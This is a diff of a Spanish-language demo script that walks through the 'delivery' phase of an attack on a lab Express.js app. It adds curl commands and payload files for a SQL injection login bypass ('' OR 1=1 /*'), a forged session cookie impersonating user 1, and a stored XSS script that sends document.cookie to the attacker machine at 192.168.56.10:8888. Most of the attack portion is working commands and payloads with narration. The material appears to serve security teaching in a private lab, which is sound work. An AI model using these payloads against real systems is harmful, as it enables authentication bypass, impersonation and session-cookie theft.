@@ -124,16 +124,22 @@
 
 ### PASO 3.1: Entrega del vector SQL Injection en `/api/login`
 
-* 🖥️ **Acción Visual:** En la terminal de Kali Linux, ejecutas la transmisión del vector SQLi enviando el archivo `payload_sqli.json` mediante `curl`.
-* ⌨️ **Comando a escribir:**
+* 🖥️ **Acción Visual:** En la terminal de Kali Linux, sobrescribes el archivo `payload_sqli.json` para asegurar el comentario sintáctico correcto y ejecutas la transmisión mediante `curl`.
+* ⌨️ **Comandos a escribir:**
   ```bash
+  cat << 'EOF' > payload_sqli.json
+  {
+    "username": "' OR 1=1 /*",
+    "password": "x"
+  }
+  EOF
   curl -i -X POST http://192.168.56.20:4000/api/login \
        -H "Content-Type: application/json" \
        -d @payload_sqli.json
   ```
 * 🗣️ **Lo que dices mientras ejecutas el comando y se recibe el `HTTP 200 OK`:**
-  > *"Iniciamos la Fase III: Entrega. La transmisión de nuestros vectores maliciosos se orquesta de manera puramente manual mediante `curl`, eludiendo por completo el uso de escáneres o herramientas automatizadas.*  
-  > *En este primer paso, transmitimos el vector de Inyección SQL enviando el archivo `payload_sqli.json` como cuerpo de la petición hacia `/api/login`. El payload viaja dentro de la estructura JSON en la variable `username`. Al llegar al servidor, el middleware `express.json()` lo procesa e inyecta directamente en la consulta del backend sin sanitización previa, logrando el bypass de autenticación instantáneo."*
+  > *"Iniciamos la Fase III: Entrega. La transmisión de nuestros vectores maliciosos se orquesta de manera manual, eludiendo escáneres.*  
+  > *En este primer paso, ajustamos nuestro vector de Inyección SQL para usar el delimitador `/*` (comentario en bloque) y lo enviamos hacia `/api/login`. Al llegar al servidor, el middleware `express.json()` lo procesa e inyecta directamente en la consulta del backend sin sanitización, logrando el bypass de autenticación instantáneo y emitiendo una cookie válida de administrador."*
 
 ---
 
@@ -146,24 +152,27 @@
        -H "Cookie: session=$COOKIE_VAL"
   ```
 * 🗣️ **Lo que dices mientras ejecutas el comando y ves la respuesta en pantalla:**
-  > *"Continuando con la entrega de vectores, inyectamos la cookie adulterada almacenada en `cookie_adulterada.txt` directamente dentro de las cabeceras HTTP de la petición GET hacia `/api/profile`.*  
-  > *Este vector es transmitido directamente a nivel de protocolo HTTP antes de que alcance el middleware de control de sesión en Express.js. Como el servidor carece de verificación de integridad HMAC (CWE-345), la cabecera es procesada limpiamente por el backend, demostrando la entrega exitosa del vector de suplantación."*
+  > *"Continuando con la entrega, inyectamos la cookie adulterada (donde suplantamos el `userId` por `1`) directamente dentro de las cabeceras HTTP de la petición GET hacia `/api/profile`.*  
+  > *Como el servidor carece de verificación de integridad HMAC (CWE-345), la cabecera es procesada limpiamente por el backend, demostrando la entrega exitosa del vector de suplantación y confirmando nuestra identidad como administrador."*
 
 ---
 
 ### PASO 3.3: Entrega del payload Stored XSS en `/api/message`
 
-* 🖥️ **Acción Visual:** Transmites el archivo `payload_xss.json` mediante una petición POST al endpoint de mensajería `/api/message`.
-* ⌨️ **Comando a escribir:**
+* 🖥️ **Acción Visual:** Aseguras el formato JSON escapando las comillas dobles internas del script XSS y lo transmites mediante una petición POST al endpoint `/api/message`.
+* ⌨️ **Comandos a escribir:**
   ```bash
+  cat << 'EOF' > payload_xss.json
+  {"receiverId": 1, "content": "<script>fetch(\"http://192.168.56.10:8888/?c=\"+encodeURIComponent(document.cookie),{mode:\"no-cors\"});</script>"}
+  EOF
   curl -i -X POST http://192.168.56.20:4000/api/message \
        -H "Content-Type: application/json" \
        -H "Cookie: session=$COOKIE_VAL" \
        -d @payload_xss.json
   ```
 * 🗣️ **Lo que dices mientras ejecutas el comando y sale `HTTP 200 OK`:**
-  > *"Finalmente, entregamos el vector de Stored XSS transmitiendo el cuerpo JSON del archivo `payload_xss.json` hacia el endpoint de mensajería interna `/api/message`.*  
-  > *La etiqueta `<script>` con el código malicioso viaja directamente dentro de la propiedad `content` de `req.body`. El servidor procesa y almacena este contenido en la base de datos sin aplicar filtros de entrada ni escape de caracteres, completando exitosamente la entrega de todos nuestros vectores de ataque."*
+  > *"Finalmente, entregamos el vector de Stored XSS transmitiendo el cuerpo JSON hacia el endpoint de mensajería interna `/api/message`.*  
+  > *La etiqueta `<script>` con el código malicioso viaja directamente en la propiedad `content`. El servidor procesa y almacena este contenido en la base de datos sin aplicar filtros de entrada ni escape de caracteres (CWE-79), completando exitosamente la entrega de todos nuestros vectores de ataque."*
 
 ---
 
